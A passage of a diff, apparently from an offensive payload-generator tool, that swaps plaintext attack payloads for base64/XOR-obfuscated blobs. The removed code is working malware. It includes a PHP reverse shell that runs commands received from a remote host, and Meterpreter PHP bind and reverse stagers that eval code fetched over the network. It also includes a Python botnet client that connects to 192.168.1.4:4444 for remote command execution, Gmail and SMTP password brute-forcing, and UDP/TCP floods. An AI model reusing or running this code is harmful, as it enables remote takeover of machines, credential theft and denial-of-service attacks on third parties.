eAAUET2l5DWwUZm9HTycGBFATGUwRDApUEB8TDQwYRQIABkMEGANJAQQNAVQQBBEBDEwRC08BEBVebE0rKSstNS8jK0EEHwIXABcIVy1GVExBF1R+Rzc8KSstKTc0Uw4DFxUGDw47Gw0TFVc7SVFFQBwrFwkAA1JmABIOGEtUEk9SZgENClxKS3pZV2Y=";
 
-    if(!function_exists('kNeoPqePPlBkaD')){
-      function kNeoPqePPlBkaD(\$c){
-        global \$dis;
-        
-      if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) {
-        \$c=\$c.\" 2>&1\n\";
-      }
-      \$QKDG='is_callable';
-      \$xMtdww='in_array';
-      
-      if(\$QKDG('shell_exec')and!\$xMtdww('shell_exec',\$dis)){
-        \$o=shell_exec(\$c);
-      }else
-      if(\$QKDG('popen')and!\$xMtdww('popen',\$dis)){
-        \$fp=popen(\$c,'r');
-        \$o=NULL;
-        if(is_resource(\$fp)){
-          while(!feof(\$fp)){
-            \$o.=fread(\$fp,1024);
-          }
-        }
-        @pclose(\$fp);
-      }else
-      if(\$QKDG('passthru')and!\$xMtdww('passthru',\$dis)){
-        ob_start();
-        passthru(\$c);
-        \$o=ob_get_contents();
-        ob_end_clean();
-      }else
-      if(\$QKDG('proc_open')and!\$xMtdww('proc_open',\$dis)){
-        \$handle=proc_open(\$c,array(array(pipe,'r'),array(pipe,'w'),array(pipe,'w')),\$pipes);
-        \$o=NULL;
-        while(!feof(\$pipes[1])){
-          \$o.=fread(\$pipes[1],1024);
-        }
-        @proc_close(\$handle);
-      }else
-      if(\$QKDG('system')and!\$xMtdww('system',\$dis)){
-        ob_start();
-        system(\$c);
-        \$o=ob_get_contents();
-        ob_end_clean();
-      }else
-      if(\$QKDG('exec')and!\$xMtdww('exec',\$dis)){
-        \$o=array();
-        exec(\$c,\$o);
-        \$o=join(chr(10),\$o).chr(10);
-      }else
-      {
-        \$o=0;
-      }
-    
-        return \$o;
-      }
-    }
-    \$nofuncs='no exec functions';
-    if(is_callable('fsockopen')and!in_array('fsockopen',\$dis)){
-      \$s=@fsockopen(\"tcp://\".\$ipaddr,\$port);
-      while(\$c=fread(\$s,2048)){
-        \$out = '';
-        if(substr(\$c,0,3) == 'cd '){
-          chdir(substr(\$c,3,-1));
-        } else if (substr(\$c,0,4) == 'quit' || substr(\$c,0,4) == 'exit') {
-          break;
-        }else{
-          \$out=kNeoPqePPlBkaD(substr(\$c,0,-1));
-          if(\$out===false){
-            fwrite(\$s,\$nofuncs);
-            break;
-          }
-        }
-        fwrite(\$s,\$out);
-      }
-      fclose(\$s);
-    }else{
-      \$s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
-      @socket_connect(\$s,\$ipaddr,\$port);
-      @socket_write(\$s,\"socket_create\");
-      while(\$c=@socket_read(\$s,2048)){
-        \$out = '';
-        if(substr(\$c,0,3) == 'cd '){
-          chdir(substr(\$c,3,-1));
-        } else if (substr(\$c,0,4) == 'quit' || substr(\$c,0,4) == 'exit') {
-          break;
-        }else{
-          \$out=kNeoPqePPlBkaD(substr(\$c,0,-1));
-          if(\$out===false){
-            @socket_write(\$s,\$nofuncs);
-            break;
-          }
-        }
-        @socket_write(\$s,\$out,strlen(\$out));
-      }
-      @socket_close(\$s);
-    }
-?>
-";
+$serbotclient = "bkxVTAUDFEYODApAEQ0GUBYQGA0LAUZpehkLGQMXEE8HFhIAFAYPABccWEMfA0pJHxwXQ1QXGR0DRUwRDB0RAhQZCA5ARRcGEw0RHEpJHwgQHxgKEnoAGwMIRBwbABsVEkkFCBQABhdQWmwPHgoJTx0XFQISBgMJF08dDgAfFB1MFRYAEBYTBGwPHgoJTwALAhUHDQULA08dDgAfFB1MMQwdEQIUemwBAxYQT0lDUkFfW0JUUldaUl5ERGMcChYbVF5QRFJdWG9uDBgCAwNGKAAEFgJcJggTAxkYDAsBXVl6UEZJTBUFHAdpehQDD0wECA4GDi8YBwcICQEdXBAZFwgcAUlECQYCHRVPU2ZFRE9UEREZFQxMJAgOBg56egIMCkUXDgIGIBEVGkQVBRwHFB8CAkBWb20JVF5QHxYMAk1GHxUQAwcJGwhLEBcAQVxQRB5OTG5mEk0HAg8dCU0UDgcQBx8UDUVvbQlaABwfFQxETG5lEAYWUAEEDQwIDQYWBBUABh4GAUcRDhEZCkVMBgsCFgoeERIAAwtITxkKHhkLHAFJRAIVGxkdEwRFX25mBw4EABUMHhMBHVReUAMLHRwJDQ1aMD0kNkFOFgkbBE0XHQcAAEsHABlBXEVeXkVvbRwZFwADAxsaABZBBxcRAhIdABZMRn5qAx0SGR8AFhkREV4VDgUDTU1lfmoWHxMHCEVZTzICHAMDUmZvbQkbEVAeRgACRRYOGgQVWAsAAgwJGhlPUB0HEQUIEQJfUllKbGBlDAJPXAUfBQgNTFhZTzICHAMDQFZvRE9UQ1BQRkllbAIABkMHUA8HTBUWABAWEwROCgMIBgYaAgQZCQdAFwEfEQIETQhAVm9ET1RDUFBGSUxFRE99ankHCRsIRVlPU0ReGgkAAk0TRn5DUFBGSUxFRE9UQ1B5b2AYFx1Vfmp5eW9gHwgQHwcGAgYDG0IJCwgdDVgVCwgFCUhPBAIDAxEGHgFNZX1qeXkDEQ8AFBtcEB0EFgUFB0o8OTcgMRMdBAAKGx0AEQQPBgIgFh0bEVlcRgQfAl5lfWp5eW8ACkVGPxgGEQMDSSAKA01UCh5QFR0eTQkcE0pKem9gZWxtZgcCBhU2CB8WTB8VEAMHCRsITG5mfWp5eW8PAxAKC1ReUCQUHAlvbWZ9anl5BBsJBA9lfWoVHBUMVm9tZn0BAhUHAmZvAAoSQxMFFR0DCAYdARcVFgkbDwBMDhAHAhUVGkBFFAAGF1xQAwQNDAhDVAAfHQQAAgQQBhsNXFALAAIMCRoZT1AdBxEFCBECXVl6eRUEGBUXCgYVFQJGVEwWCRsEDxkSSDohMTRHFQcUAgMaH0kNAQBLAB8UHUVMbmYHDgQAFQweEwEdWhAEERQdGAkXR11peQMLHRwWAR0CBgJeAwEACkxGfml5FgkcAgFEUlQlERwVDFdvbmYSDAJQCEkFC0QdFQ0XFU4EBQsNAgEOXFALCBQMCRoZSEFZXGNlbA0JVEsWHxMHCEVZUlQlERwVDEVfbk9UQ1BQRklMbG0JGxFQB0YAAkUUHRsHBRMSQQ8KCQ0dDREEDwYCSRYKBAYRBFsHRV9uT1RDUFBGSUxFRE9Uanl5EQYeAURSVERXXgwGBQtMGF1pUFBGSUxFRE9UQ1BQb2BlERYWTml5eW9gZRYJGwQQFQIQDB5LCAATCh5YAwQNDAhDVBMRAxUeAxcARn5qeXlvYB8EEgokAgMDThkNFhcYGxEUWWxgZWxtZhIMBR4CSVFFMB0BBnp5b2BlbAYdEQIbem9gZWwBFxcGAARcY2VsbWZ9ExEDFWNlbAEDBwZKem9gZQcWChUIenoFBQ0WF08BBwA2CgYDAUwbHBEVEQIAAgJKOxwRFRECQFZvRE9UQxQVAEkzOg0BHRcvL0ZBHwAICVhDBhkFHQUIDR9YQwYZBR0FCBQABhdZSmxJTEVET1RDUAQOGwkEAAYaBF4kDhsJBABBKzwZHg8dMzpMHBEPFllsSUxFRE9UQ1ADAwUKSxIGFxcZHQ8ZTFhEGR0ABBkLABxvbRwRDxZeEAAPEQ0CBAwCBEZUTBMNDAAKHQAJGxhvbk9UQ1AUAw9MFxEBXBAVHABAVm9tGx0OFR8THUxYRBsdDhVeEgABAExGVEhQRlZjTEVET1RDUFARAQUJAU8gEQUVXGNMbG0bERAEUFtJXG9ET1RDeXkPD0xNEAYZBl4EDwQJTU1PSF5QBA8ECQoRG11ZenlvYB9FWU8HDBMbAx1EJCIwPS01JEpJPyonJCsnNyInJEVvbWZ9EF4TCQcCAAcbXEsDFQoPQhMNDAAKHRkWRUwMChtcEBUcAEcaDAcbHQ4AHxQdRUxNZX1qeQNIGgkLAEdTIldQTElaUFRfREpQUEZJTEVET35qeRUKGglfbmZ9ahICAwgHb24MGAIDA0YdDxUiAxsMFFgSAR4ABQsdDRdeMgEeAAULXVl6UEZJTAEBCVQ8LxkIABg6O09cEBUcAEVMEw0MAAodGRZFTBMNDAAKHQAJGxhMXmVUQ1BQRklMRRAHBgYRFA8HC0swBwYGERRINjMMCgYAPC9YFQwAA01lVENQUEZJTEUXChgFXgYPChgMCQYEQ01QEAAPEQ0CHRN6eRUMAANKGR0ABBkLGQMXEE9JQwYZBR0FCBQABhd6ekZJTEUAChJDAgUIQR8ACAldWXp5EgABAAsaAENNUBIAAQBKGx0OFVhPSUdFUl9+Q1BQRklMRUQYHAocFUY9HhABVX5DeXkSDB8RRFJUU3pQRklMbG0GEkNYBA8ECUsQBhkGWFlGVVFFEAYZBh8FEkBWb21mfRBQTUYaAwYPCgBLMTY5ICIgMENUMD8zLTY/MTYqNS5Zem9gZRZKHBEXBBkLDAMQEEdFSnp5b2AfSwcAGg0VExJBRBYBAxJNBhkFHQUIDR9YQxkeEkEfAAgJWhUZExIAARULHQBKWVlsYGVsF0EHBh4UTk4tQkRFVFVFQFZZRUVET1RDUFBsYGUACBwRWXp5b2AOFwEOH2l6FAMPTBAAHyENHBUHCgRNEgYXFxkdDxlARRIGFxcZHRYGHhFNVX5qBBgUDA0BF09JQystbGAKChZPHUMZHkYbDQsDClxSXFBXWEVfbk9UQ1B5bx0EFwEOEENNUBMNHCMIABsHWAYPChgMCQYET1AGDwoYDAkfGxEEWWxJTEVEZn0XGAIDCAhLFxsVEQRYT2NMRURmfRcYAgMICBZKDgQTFR4CQRgNFgoVB1l6RmNlAwsdVBcYAgMICEUNAVQXGAIDCAgWXmVUQ1BQb2AYDRYKFQdeGgkAAk1NZX4HFRZGHQ8VMQEYBhETDkEaDAcbHQ4ZAEpJGgwHGx0OAB8UHUVfbmYACwIVBw0fRVlPLz56eQAGHkUNTx0NUAIHBwsATF5YQ0FBT1NmRURPVGp5BA4bCQQAT0lDBBMWLwAKCwtcFRkTEgABDBRDVBUZExIAARULHQBKelBGSUxsbRscERURAkcfEQUdAEtZekZJTGxtGxwRFRECGkIEFB8RDRRYEgEeAAULXWlQem8PAxdEGxwRFRECSQULRBscERURAhpWb0RPVEN5eRIBHgAFC1oJHxkIQUVvbgsRBVAdBwACTU1VfmoHGA8FCUVVVX5qeQNbGgMGDwoASzE2OSAiIDBDVDA/My02PzE2KjUuWXpvYBsNDQMRQ0FKbGBlbBAdDVl6eW9gZRZKDBsNHhUFHURNDAAHF1wACRsYTE1lfWp5eRYbBQsQT1Y4OT4gJjFFJwAaDRUTEgwIR25mfWp5EhQMDQ5uZn1qFQgFDBwRXmV9anl5EgABAEocGAYVAE5cRW9tZn5qeQcOAAAARF5OaXl5bx0eHF5lfWp5eQsaC1gXQQYGEwZOWFxXUF9daXl5b2AFA0RHXA4DF0ZIUUVGCgwKBFJPSQ0LAE9cQRMURktMCwsbVAoeUAsaC0xEDhoHUFhEHAgVAgMbDBRQREkCChBPHQ1QHRUORUUFARBDWFISChwDCAAbB1BSRgcDEUQGGkMdAwFATAQKC1RLHQMBSU1YRE0cBhwcCR4fVFZcVkpQEQgNTE1GGhATFhwJBggECANUQVAeCR1MDApPGRAXWUYIAgFER1YXEwAABQMKAA4YD1BSRgcDEUQGGkMdAwFATAQKC1RLUhcLCAUJBh0BFxUWCRsPAEZPGgwEUA8HTAgXCF1DER4CSURHCAYCBhICEx0JAwsdFwZSUAgGGEUNAVQOAxdPSQ0LAE9cQQkRDgYDBxYaAAYWHxQKCUdEARsXUBkISQEWA0ZUAh4URkFOBAsDFhEFBAMPAxcHClZDHh8SSQULRAIHBFlQBwcIRUxNFxYDBAkEDhcRGxEFHwIFDE5FCgAAQxkeRgQfAk1GTml5eW9gZQYLAhlDTVAVHA4VFgAXBgMDSDkDFQEBXBAEAk4EHwJNQ1QQGBUKBVExFhoRT1ADEg0DEBBSBxYSABQGDwAXHFozOSAjRUwWEAsREQJNFRwOFRYAFwYDA0g5JTUhQ1QQBBQPB1EWEQ0EER8TAxofSzQmJCZZem9gZWxtHB0EHhEKRx8MAwEVD1gDDw4CBAhBJyo3MSo7IUlEDhgCAh05AQ0LAAMREVl6b2BlbG0cHQQeEQpHDQkFHRlLQ0BPY2VsbWZ9FwIJXGNMRURPfWp5eW9gPzEgICE3XFA1PSggNj1UXlATCQQBSwcAGQ4FHg8KDREBR11peXlvYGVsAQErMCQ0Izs+RVlPFhoEFQcbHgQdRyc3NDU0O0VvbWZ9anl5AwczNjArOzYkUFtJDhwQChURAhEfQT8xICAhN1l6b2BlbG1mHQVQWAMHMzYwKzExIlBbVExHRkZOaXl5b2BlbG0GEkNYFQg2PzEgICE3UFFbSU5HTVV+anl5b2BlbG0fBgoeBEYMAjo3OzAsJSRsYGVsbWZ9ankDSBoJCwBHEQ0vIzItIzAwRn5qeXlvYGVsAQMHBkp6b2BlbG1mfWoDXhUMAgFMTS8gPDkjJzg4RCwbDh0RCA1MIBwKFxYEFQJLRW9tZn1qeXkDBR8AXmV9anl5b2BlFRYGGhdQFQg2PzEgKiYxenlvYGVsbWYHTQMVCA1EAAowJzc0NTQ7RW9tZn1qeRUeCgkVEE81DxECC1NmbG1mfWp5EwkEAUsQCgYOGR4HHQlNTWV9anl5b2APCgkCWggZHApBRW9ET1RDeXlvYGVsF0EHBh4UTks3JigmMS0kLUZaXEU3ChcMHhQVSSkdBwoRBxUURkRMNhENJBEfEwMaH0UvBhgPFRQ6B05MbWZ9anp5b2BlbBcGEw0RHEgIAAQWAlxTWXpvYGVsAQMdBVBYRAoIRUZPHQ1QHRUORV9uZn1qeXkLGgtFWU8ZEBdeFAwcCQUMEUtSEwJJTklGTV1peXlvYGUKF0EXCxQZFEEBFgNGfmp5eW9gH0sXChoHWB8VRwsAEAwDB1hZT2NlbG1mfRMCGQgdTEc/JjolPy1GKgQECggRB1AUDxtMEQtPURBSUENJAxZKCBEXEwcCQUVvbWZ9ahUcDw9MTUYaEBMWHAkGCEVGTx0NUB0VDkVfbmZ9anl5CxoLRVlPGRAXXhQMHAkFDBFLUgUCGQoJCwAQQ1JcRktOTG5mfWp5eRUMHAAWDgAMAlBbSQEWA0EdDRQVHkFOX0ZGfmp5eW9gGBcdVX5qeXlvYGUQAB8hDRwVBwoETQkcEzhKAwMZCRcFGxsRLVwLGgs+FwoEBgIREgYeTlVVKUp6eW9gZWwBFxcGAARcY2VsbWZ9agARFRpmbG1mfQYcGQBJREcRCwQFHB8JDQ0JCE9WQxkeRgQfAk1Vfmp5eW9gARYDT0lDHQMBRx4AFAMVABVYRBwIFQIDGwwUEQoFTEdIT1ZBWXpvYGVsbRwRExUCBx0DF0RSVA4DF0gAAgEBF1xBSlJPY2VsbWZ9FwIJXGNlbG1mfWoFFBY8AgkBDhcLWB0VDjdfFwoEBgIREgYeOEgCBwQrAwMZCRcFGxsRW0FcNEVvbWZ9ankVHgoJFRBVfmp5eW9gZRUFHAdpeXlvYAkJDQlUS1IEBRkKCQsAEENSUA8HTAgXCF1ZenlvYGVsCRwTQ01QCxoLSxYKBA8REwNBThEHHxIPHx8CSU5JRE1WSnp5b2BlbBcKBAYCERIGHkVZTxkQF14PBwgAHEdWWVJZbGBlbG1mABEJSmxgZWxtZn0XEwAzBwAABQwcSx0DATJWFgEfERERBAkbMUkJHBM4AxUWDB4EEAAGSEFKO0BmbG1mfWoVCAUMHBFeZX1qeXlvYBwEFxx+anl5bwwADAJPXEEEExYPAAoLCxUPHFBESQULRAIHBFlKbGBlbG1mGRAXUFtJARYDQQYGABwHCglNRhsXExYcCQYIBAgDVEFcUERLRW9tZn1qeQMDGQkXBRsbEVBNRgQfAkoGGgcVCE5LVkdNZX1qeXlvHR4cXmV9anl5b2AYBhQ6Gg8VEQUBRAgXCC9ZAxUWDB4EEAAGPlwdFQ43FgEfERERBAkbR1ReMl1peXlvYGUAHAwREwRKbGBlbG1mfRMRAxVjZWxtZhEPGRZGQU4CCQ4dDxICEx0JAwsdFwZQUkYAAkUJHBNKSnpvYGVsbQIHBFBNRgQfAkodERMcEQUMREcDAhUKHBIUHBgAAgAGABVQREVMR0ZGfmp5eW9gGBcdVX5qeXlvYGUACQ4dD1xQBQYBBw0BFRcZHwhFTAgNAR0OBR1KSQEEHAYZFh1QW0kBFgNBBxMcGRJBTl9GRn5qeXlvYGURRFJUNxgCAwgITSoAGgZcFwsIBQkGHQEXFRYJGw8ASCEbDRVcTgwBBA0DWEMTHwsLBQsFGx0MHlxGBAULDQIBDlxQCwgUDAkaGUpZekZJTEVET1RDeXlvYGURShwAAgIETkBmbG1mfWp5A0gaCQsAR1Y4OT4gJjFFJh0BFxUWCRsPDAoIVBAEERQdCQE4AVZKeXlvYGZsbWZ9ahUIBQwcEV5lfWp5eW9gH0sXChoHWFI9LD43Kz0pQycCCQcLRQUdExYdFQgdHzkKTV1peXlvYAkJDQlUS1IcDx8JBxYaAAYWHxQKCUVGTx0NUB0VDkVfbmZ9anl5CxoLRVlPGRAXXhQMHAkFDBFLUhwPHwkHFhoABhYfFAoJRUZDVEFSWWxgZWxtZgARCUpsYGVsbWZ9Bh0RDwVARQcAGQEZHgcdBQoKQ1QOGR4PBBkISE8ZAggZCxwBRVlPGRAXXhUZAAwQR1ZZUllsYGVsbWZ9F1BNRj0EFwEOEEs+HwgMQAYRHAAMHRIUHBgAAgAGABVcKAYCAEhHVhAdBBZHAAwSCloAHx1ERUxQXFhYQxUdBwAASUQMGw4SGQgIGAwLAVhDHRkIAAEQCUNUDhEIDwQZCE1GfkNQUEZJTEVEZn1qeXkSRx8RBR0AS1l6b2BlbG1mB00DFQgNREc/JjolPy1GKx4QEAoSDAITDwcLRRcbFREEFQI1AkdNZn1qeXpvYGVsbQoMABUAElNmbG1mfWp5A0gaCQsAR1Y4NSI0Jj44RDgGDB4XRggeAhECEQ0EAzoHTkxuZn1qeRUKAApFTE0NAhgfCQseEBAKEgwCEwNJTkUNAVQOAxdPU2ZsbWZ9ah0DAUlRRQkcE00CFRYFDQYBR1YaERgJBg4XERsRBR8CBQxMR0hPVkFZem9gZWxtGwYaSnpvYGVsbWYRDhEZCkVMBgsCFgoeERIAAwtITxkKHhkLHAFJRAIVGxkdEwRMWEQCBwReAxYFBRFMTU5BWXpvYGVsbWYAQ01QMgEeAAULXC0fHgNFDxAXGxsOEgITHQkDCx0XBlw+CQcJSUxNBw4EAEgEDQwIQQ0CGB8JRw8KCU1YQ0VIUUVMAAkOHQ9cUAUGAQcNARUXGR8IRUwIDQEdDgUdSkkBBBwGGRYdWU9jTEVET1RDUFBvYGVsbRtaEAQRFB1ETG5mfWp5eW8aQhYBARBLUisvJyoqOU82EQUEAw8DFwcGGgRQAxIIHhEBCygNUllvYGVsbmZ9anl5AxEPABQbTml5eW9gZWwXQQcGHhROSzcgNj07MS1QMRsDCwNPFREXBQsMAhEXMxpBWXpvYGVsAQMdBVBYRAgDCQYdARcVFgkbDwBETVQKHlALGgtMXmV9anl5bwQfAkRSVA4DF0gbCRUIDhcGWFIHBgAHFhoABhYfFAoJRUZDVEFSWWxgZWxtZgARCUpsYGVsbWZ9Bh0RDwVARQcAGQEZHgcdBQoKQ1QOGR4PBBkISE8ZAggZCxwBRVlPGRAXXhUZAAwQR1ZZUllsYGVsbWZ9F1BNRj0EFwEOEEs+HwgMQAYRHAAMHRIUHBgAAgAGABVcKAYCAEhHVhAdBBZHDQoIQRcMHVJKSVldU0NUBh0RDwVARQcAGQEZHgcdBQoKQ1QOGR4PBBkISE8ZAggZCxwBTE1lVENQUEZJTEVtZn1qeQRIGhgEFhtcSnp5b2BlbG0cWhAVHgJBTj4tITIsLVAkGxkRAQkbERMZCA5MFhAOBhcVFDoHTkxtZn1qenlvYGVsARcXBgAEXGNlbG1mfWoDXhUMAgFMTS8mIiIpOzFFMx0bDRdQBxsLEAkKGhcDLAhLRW9tZn1qFRwPD0xNRgwBEAQfCwseEBAKEgwCEwNJTkUNAVQOAxdPU2ZsbWZ9ah0DAUlRRQkcE00CFRYFDQYBR1YABQMSBgEHFhoABhYfFAoJRUZDVEFSWWxgZWxtZgARCUpsYGVsbWZ9AhQUFAwfFkhPBAwCBEpJCQgFBhhPUBMJBA4MCg4ACh8eSkkBDAoGGRYdXEYEDR0NAgEOUE1GBB8CShwEDxkETktWR01lfWp5eW9gGEVZTyALAhUHDUQrCwERTxMFFR0DCAYdARcVFgkbDwBIIRsNFVxOCAgBFgoHEFxQFgYeEUhPEQ4RGQpFTAYLAhYKHhESAAMLSE8ZCh4ZCxwBSUQCFRsZHRMERUxuT1RDUFBGSUxsbWZ9agReFR0NFxBHXWl5eW9gZWwXQQcGHhROSzcsKik7PlAyFBwYAAIABgAZHgFJHxEFHQAGFCwIS0VsbWZ9aXl5b2BlABwMERMESmxgZWxtZn0QXgMDBwhNRjQxMSI/NDRMMhYAGgRQERQOGQgBAQAQLB5EQGZsbWZ9BhwZAElECBcIVF5NUEQBCQkIAAMQQUJVS0VfbmZ9anl5FUcfAAoLXAwDXgEMGAYTC1xKWXpvYGVsAQMHBkp6b2BlbG0fBgoeBEZLNywqKTs+UDMJBwIABxsdDB5QJQUDFgELVml5eW9gZRZKDBgMAxVOQGZsbWZ9ahICAwgHb21mfQYIEwMZGEUvCg0BHxEUDSULEAoGEQUAElNmbG1mfRMCGQgdTEc/JjolPy1GKgMLCgoXFxkfCEkvCQscEQdSem9gZWwXQRcPHwMDQUVvbWZ9ahICAwgHb21mfQYIEwMZGF9uZn1qeQAUAAIRRE0vKj42KTRMJgsBGgYTBA8GAkUnAxsQFRREY2VsbWYHTRMcCRoJTU1lfWp5eQQbCQQPZX1qeXoRAQUJAU9FWXp5EhsVX25mfQ4RGQhBRW9tCgwAFQASU2ZsbR8VEAN6bGAYDAkKWhAcFQMZRFBNZQ==";
 
-$meterpreterbindshell = "
-<?php
-
-# The payload handler overwrites this with the correct LPORT before sending
-# it to the victim.
-\$port = 4444;
-\$ipaddr = \"0.0.0.0\";
-
-if (is_callable('stream_socket_server')) {
-	\$srvsock = stream_socket_server(\"tcp://{\$ipaddr}:{\$port}\");
-	if (!\$srvsock) { die(); }
-	\$s = stream_socket_accept(\$srvsock, -1);
-	fclose(\$srvsock);
-	\$s_type = 'stream';
-} elseif (is_callable('socket_create_listen')) {
-	\$srvsock = socket_create_listen(AF_INET, SOCK_STREAM, SOL_TCP);
-	if (!\$res) { die(); }
-	\$s = socket_accept(\$srvsock);
-	socket_close(\$srvsock);
-	\$s_type = 'socket';
-} elseif (is_callable('socket_create')) {
-	\$srvsock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
-	\$res = socket_bind(\$srvsock, \$ipaddr, \$port);
-	if (!\$res) { die(); }
-	\$s = socket_accept(\$srvsock);
-	socket_close(\$srvsock);
-	\$s_type = 'socket';
-} else {
-	die();
-}
-if (!\$s) { die(); }
-
-switch (\$s_type) {
-case 'stream': \$len = fread(\$s, 4); break;
-case 'socket': \$len = socket_read(\$s, 4); break;
-}
-if (!\$len) {
-	# We failed on the main socket.  There's no way to continue, so
-	# bail
-	die();
-}
-\$a = unpack(\"Nlen\", \$len);
-\$len = \$a['len'];
-
-\$b = '';
-while (strlen(\$b) < \$len) {
-	switch (\$s_type) {
-	case 'stream': \$b .= fread(\$s, \$len-strlen(\$b)); break;
-	case 'socket': \$b .= socket_read(\$s, \$len-strlen(\$b)); break;
-	}
-}
-
-# Set up the socket for the main stage to use.
-\$GLOBALS['msgsock'] = \$s;
-\$GLOBALS['msgsock_type'] = \$s_type;
-eval(\$b);
-die();
-?>
-";
-
-$meterpreterreverseshell = "
-#<?php
-
-error_reporting(0);
-# The payload handler overwrites this with the correct LHOST before sending
-# it to the victim.
-\$ip = '192.168.1.104';
-\$port = 4444;
-\$ipf = AF_INET;
-
-if (FALSE !== strpos(\$ip, \":\")) {
-	# ipv6 requires brackets around the address
-	\$ip = \"[\". \$ip .\"]\";
-	\$ipf = AF_INET6;
-}
-
-if ((\$f = 'stream_socket_client') && is_callable(\$f)) {
-	\$s = \$f(\"tcp://{\$ip}:{\$port}\");
-	\$s_type = 'stream';
-} elseif ((\$f = 'fsockopen') && is_callable(\$f)) {
-	\$s = \$f(\$ip, \$port);
-	\$s_type = 'stream';
-} elseif ((\$f = 'socket_create') && is_callable(\$f)) {
-	\$s = \$f(\$ipf, SOCK_STREAM, SOL_TCP);
-	\$res = @socket_connect(\$s, \$ip, \$port);
-	if (!\$res) { die(); }
-	\$s_type = 'socket';
-} else {
-	die('no socket funcs');
-}
-if (!\$s) { die('no socket'); }
-
-switch (\$s_type) { 
-case 'stream': \$len = fread(\$s, 4); break;
-case 'socket': \$len = socket_read(\$s, 4); break;
-}
-if (!\$len) {
-	# We failed on the main socket.  There's no way to continue, so
-	# bail
-	die();
-}
-\$a = unpack(\"Nlen\", \$len);
-\$len = \$a['len'];
-
-\$b = '';
-while (strlen(\$b) < \$len) {
-	switch (\$s_type) { 
-	case 'stream': \$b .= fread(\$s, \$len-strlen(\$b)); break;
-	case 'socket': \$b .= socket_read(\$s, \$len-strlen(\$b)); break;
-	}
-}
-
-# Set up the socket for the main stage to use.
-\$GLOBALS['msgsock'] = \$s;
-\$GLOBALS['msgsock_type'] = \$s_type;
-eval(\$b);
-die();
-?>
-";
-
-$serbotclient = "
-#!/usr/bin/env python2
-
-import subprocess, os, sys, time, threading, signal, smtplib
-from socket import *
-from itertools import product
-from threading import Thread
-
-host = \"192.168.1.4\"
-port = 4444
-
-class Alarm(Exception):
-    pass
-
-def alarm_handler(signum, frame):
-    raise Alarm
-
-def savePass(password):
-	f = open(\"password.txt\", \"w\")
-	f.write(password)
-	f.close()
-
-def gmailbruteforce(email, combination, minimum, maximum):
-	smtpserver = smtplib.SMTP(\"smtp.gmail.com\",587)
-	smtpserver.starttls()
-	smtpserver.ehlo()
-
-	found = False;
-
-	for n in range(minimum, maximum+1):
-		if (found == False):
-        		for w in product(combination,repeat=n):
-            			word = ''.join(w)
-            			try:
-					smtpserver.login(email, password)
-				except(smtplib.SMTPAuthenticationError), msg:
-					if \"Please Log\" in str(msg):
-						savePass(password)
-						found = True
-						break
-		else:
-			break
-
-def custombruteforce(address, port, email, combination, minimum, maximum):
-	smtpserver = smtplib.SMTP(address,int(port))
-	smtpserver.starttls()
-	smtpserver.ehlo()
-
-	found = False;
-
-	for n in range(minimum, maximum+1):
-		if (found == False):
-        		for w in product(combination,repeat=n):
-            			word = ''.join(w)
-            			try:
-					smtpserver.login(email, password)
-					savePass(password)
-					found = True
-					break
-				except:
-					pass
-		else:
-			break
-
-class udpFlood(threading.Thread):
-    def __init__ (self, victimip, victimport):
-        threading.Thread.__init__(self)
-        self.victimip = victimip
-	self.victimport = victimport
-
-    def run(self):
-	timeout = time.time() + 60
-        while True:
- 		test = 0
-    		if (time.time() <= timeout):
-			s = socket(AF_INET, SOCK_DGRAM)
-			s.connect((self.victimip, int(self.victimport)))
-			s.send('A' * 65000)        
-		else:
-			break
-
-class tcpFlood(threading.Thread):
-    def __init__ (self, victimip, victimport):
-        threading.Thread.__init__(self)
-        self.victimip = victimip
-	self.victimport = victimport
-
-    def run(self):
-	timeout = time.time() + 60
-        while True:
- 		test = 0
-    		if (time.time() <= timeout):
-			s = socket(AF_INET, SOCK_STREAM)
-			s.settimeout(1)
-			s.connect((self.victimip, int(self.victimport)))
-			s.send('A' * 65000)       
-		else:
-			break
-
-def udpUnleach(victimip, victimport):
-	threads = []
-	for i in range(1, 11):
-    		thread = udpFlood(victimip, victimport)
-    		thread.start()
-   		threads.append(thread)
- 
-	for thread in threads:
-    		thread.join()
-
-def tcpUnleach(victimip, victimport):
-	threads = []
-	for i in range(1, 11):
-    		thread = tcpFlood(victimip, victimport)
-    		thread.start()
-   		threads.append(thread)
- 
-	for thread in threads:
-    		thread.join()
-
-def main():
-	while 1:
-		s=socket(AF_INET, SOCK_STREAM)
-		while 1:
-			try:
-				s.connect((host,port))
-				print \"[INFO] Connected\"
-				break
-			except:
-				time.sleep(5)
-		
-		while 1:
-			try:
-				msg=s.recv(10240)
-				if ((msg != \"exit\") and (\"cd \" not in msg) and (\"udpflood \" not in msg) and (\"tcpflood \" not in msg) and (msg != \"hellows123\") and (\"udpfloodall \" not in msg) and (\"tcpfloodall \" not in msg) and (\"gmailbruteforce\" not in msg) and (\"livebruteforce\" not in msg) and (\"yahoobruteforce\" not in msg) and (\"aolbruteforce\" not in msg) and (\"custombruteforce\" not in msg)):
-					comm = subprocess.Popen(str(msg), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-					signal.signal(signal.SIGALRM, alarm_handler)
-					signal.alarm(30)
-					try:
-    						STDOUT, STDERR = comm.communicate()
-						en_STDERR = bytearray(STDERR)
-						en_STDOUT = bytearray(STDOUT)
-						if (en_STDERR == \"\"):
-							if (en_STDOUT != \"\"):
-								print en_STDOUT
-								s.send(en_STDOUT)
-							else:
-								s.send(\"[CLIENT] Command Executed\")
-						else:
-							print en_STDERR
-							s.send(en_STDERR)
-					except Alarm:
-						comm.terminate()
-						comm.kill()
-    						s.send(\"[CLIENT] 30 Seconds Exceeded - SubProcess Killed\\n\")				
-					signal.alarm(0)
-				elif (\"cd \" in msg):
-					msg = msg.replace(\"cd \",\"\")
-					os.chdir(msg)
-					s.send(os.getcwd())
-					print \"[INFO] Changed dir to %s\" % os.getcwd()
-				elif (\"udpflood \" in msg):
-					msg = msg.replace(\"udpflood \", \"\")
-					seperator = msg.index(\":\")
-					try:
-						udpUnleach(msg[:seperator],msg[seperator+1:])
-					except:
-						pass
-				elif (\"udpfloodall \" in msg):
-					msg = msg.replace(\"udpfloodall \", \"\")
-					seperator = msg.index(\":\")
-					try:
-						udpUnleach(msg[:seperator],msg[seperator+1:])
-					except:
-						pass
-				elif (\"tcpflood \" in msg):
